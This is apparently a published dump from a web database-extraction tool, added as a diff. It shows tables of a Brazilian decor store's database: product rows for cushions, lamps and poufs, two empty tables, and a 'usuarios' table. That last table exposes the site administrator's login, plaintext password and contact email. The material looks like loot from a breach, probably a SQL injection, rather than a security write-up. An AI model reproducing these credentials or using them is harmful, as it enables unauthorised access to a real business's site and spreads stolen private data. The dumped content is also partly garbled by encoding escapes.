+| 101    | NULL      | 1          | <blank>             | 1       | 57      | <p>Possui uma estampa extremamente alegre e moderna. &Eacute; perfeita para acompanhar sof\xe1s, camas e                                                                                                         | ALMOFADA  30X45 CONFETES                      | 12245495.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 102    | NULL      | 1          | <blank>             | 1       | 57      | <p>Possui uma estampa extremamente alegre e moderna. &Eacute; perfeita para acompanhar sof\xe1s, camas e                                                                                                         | ALMOFADA 30X45 LISTRAS                        | 12262066.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 103    | NULL      | 1          | <blank>             | 1       | 57      | <p>Possui cores vibrantes que resultam numa estampa extremamente alegre. \xc9 perfeita para acompanhar s                                                                                                         | ALMOFADA 30X45 ZÍPER                          | 12272697.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 104    | NULL      | 1          | <blank>             | 1       | 58      | <p>Com formato de “Lib\xe9lula”, essa                                                                                                                                                                            | Luminária Solar Decorativa                    | 12361744.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 105    | NULL      | 1          | <blank>             | 1       | 58      | <p>Possui haste flex\xedvel que permite foco direc                                                                                                                                                               | LUMINÁRIA DE MESA VERMELHA                    | 12393196.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 106    | NULL      | 1          | <blank>             | 1       | 58      | <p>\xc9 perfeita para levar descontra\xe7&atil                                                                                                                                                                   | LUMINÁRIA DE PISO - PRETA                     | 12414714.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 107    | NULL      | 1          | <blank>             | 1       | 58      | <p>Pensada para ir desde a lateral da cama ou do sof&aacute;, at\xe9 home offices, escrit\xf3rios e                                                                                                              | LUMINÁRIA DE MESA - VERMELHA                  | 12434198.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 108    | NULL      | 1          | <blank>             | 1       | 58      | <p>Pensada para ir desde a lateral da cama ou do sof&aacute;, at\xe9 home offices, escrit\xf3rios e                                                                                                              | LUMINÁRIA DE CHÃO MÉDIA                       | 12471474.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 109    | NULL      | 1          | <blank>             | 1       | 58      | <p>Beleza e estilo para iluminar o seu ambiente! A Lumin\xe1ria de Mesa Azul possui linhas retas e um de                                                                                                         | LUMINÁRIA DE MESA - AZUL                      | 12503078.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 110    | NULL      | 1          | <blank>             | 1       | 59      | <p>Produzido com material de alta qualidade e \xf3                                                                                                                                                               | Puff em Korino - Preto                        | 12543114.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 111    | NULL      | 1          | <blank>             | 1       | 59      | <p>Produzido com material de alta qualidade e \xf3                                                                                                                                                               | Puff em Tecido Florido - Bege                 | 12562802.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 112    | NULL      | 1          | <blank>             | 1       | 59      | <p>Garantia certa de conforto e mobilidade, ela &eacute; um modelo pr\xe1tico onde voc\xea poder&aacu                                                                                                            | Poltrona Inflável - Verde                     | 7286081.jpg  | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
++--------+-----------+------------+---------------------+---------+---------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------+--------------+----------+-----------+-----------+-----------+--------------+----------------+----------------+--------------------+--------------------+---------------------+---------------------+---------------------------+----------------------------+
+
+Database: alvesmad_bd
+Table: produtos_fotos
+[0 entries]
++--------+---------+----------+----------+
+| fot_id | fot_pro | fot_foto | fot_nome |
++--------+---------+----------+----------+
++--------+---------+----------+----------+
+
+Database: alvesmad_bd
+Table: produtos_informacoes
+[0 entries]
++--------+---------+----------+----------+
+| inf_id | inf_pro | inf_desc | inf_nome |
++--------+---------+----------+----------+
++--------+---------+----------+----------+
+
+Database: alvesmad_bd
+Table: usuarios
+[1 entry]
++--------+---------------+-----------+-----------+-------------------------------+
+| usu_id | usu_nome      | usu_login | usu_senha | usu_email                     |
++--------+---------------+-----------+-----------+-------------------------------+
+| 1      | Alves Madeira | admin     | 1sHL1s    | contatos@alvesmadeiras.com.br |
++--------+---------------+-----------+-----------+-------------------------------+
+
